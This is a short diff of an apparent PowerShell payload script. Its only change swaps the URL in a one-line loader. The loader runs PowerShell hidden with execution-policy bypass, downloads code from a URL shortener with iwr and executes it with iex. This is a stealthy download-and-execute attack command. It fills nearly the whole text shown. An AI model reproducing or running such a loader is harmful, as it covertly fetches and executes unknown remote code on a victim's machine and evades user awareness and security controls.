@@ -37,7 +37,7 @@
 	variable and it will still run.
 #>  
 
-$code = "powershell -w h -NoP -NonI -Ep Bypass iwr shorturl.at/iuBN5 | iex"
+$code = "powershell -w h -NoP -NonI -Ep Bypass iwr shorturl.at/bpRX6 | iex"
 
 ############################################################################################################################################################
 
